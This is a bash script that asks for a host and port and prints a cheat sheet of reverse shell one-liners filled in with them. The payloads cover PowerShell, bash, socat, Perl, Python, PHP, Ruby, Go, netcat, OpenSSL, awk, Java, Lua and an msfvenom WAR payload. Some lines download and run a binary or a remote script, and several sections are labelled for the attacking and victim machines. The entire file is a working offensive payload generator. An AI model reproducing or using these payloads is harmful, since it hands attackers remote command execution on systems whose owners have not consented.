#!/bin/bash
set -e
read -p "who are you? " host
read -p "got a port for that chief? " port
printf "\nPSHELL\n"

echo "\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

echo "\$sm=(New-Object Net.Sockets.TCPClient('$host',$port)).GetStream();[byte[]]\$bt=0..65535|%{0};while((\$i=\$sm.Read(\$bt,0,\$bt.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$bt,0,\$i);\$st=([text.encoding]::ASCII).GetBytes((iex \$d 2>&1));\$sm.Write(\$st,0,\$st.Length)}" 

printf "\nBASH TCP\n"

echo "bash -i >& /dev/tcp/$host/$port 0>&1"

echo "0<&196;exec 196<>/dev/tcp/$host/$port; sh <&196 >&196 2>&196"

echo "BASH UDP"

echo "sh -i >& /dev/udp/$host/$port 0>&1"

echo "USE nc -u -lvp $port with this one"

printf "\nSOCAT\n"

echo "ATTACK MACHINE"

echo "socat file:`tty`,raw,echo=0 TCP-L:$port"

echo "VICTIM MACHINE"

echo "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$host:$port"

echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$host:$port" 

printf "\nPERL\n"

echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$host:$port\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"

echo "WINDOWS ONLY"

echo "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$host:$port\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"

printf "\nPYTHON\n"

echo "LINUX"

echo "export RHOST=\"$host\";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

echo "WINDOWS"

echo "C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$host', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""

printf "\nPHP\n"

echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"


echo "php -r '\$sock=fsockopen(\"$host\",$port);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);system(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"

printf "\nRUBY\n"

echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$host\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

echo "WINDOWS ONLY"

echo "ruby -rsocket -e 'c=TCPSocket.new(\"$host\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

printf "\nGOLANG\n"

echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$host:$port\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"

printf "\nNC TRAD\n"

echo "nc -e /bin/sh $host $port"

echo "nc -e /bin/bash $host $port"

echo "nc -c bash $host $port"

echo "NCAT OPENBSD"

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f"

echo "NCAT"

echo "ncat $host $port -e /bin/bash"

echo "ncat --udp $host $port -e /bin/bash"

printf "\nOPENSSL\n"

echo "attacking machine"

echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"

echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"

echo "or"

echo "ncat --ssl -vv -l -p $port"

echo "victim"

echo "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $host:$port > /tmp/s; rm /tmp/s"

printf "\nEXTRA POWERSHELL\n"

echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$host\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""

echo "powershell IEX (New-Object Net.WebClient).DownloadString('https://$host/minrev.ps1')"

printf "\nAWK\n"

echo "awk 'BEGIN {s = \"/inet/tcp/0/$host/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"

printf "\nJAVA\n"

echo "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$host/$port;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"

echo "JAVA alt"

printf "String host=\"$host\";\nint port=$port;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"

printf "\nWAR\n"

printf "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$host LPORT=$port -f war > reverse.war \n strings reverse.war | grep jsp # in order to get the name of the file"

printf "\nLUA\n"

echo "LIN ONLY"

echo "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$host','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');\""

echo "WIN AND LIN"

echo "lua5.1 -e 'local host, port = \"$host\", $port local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"

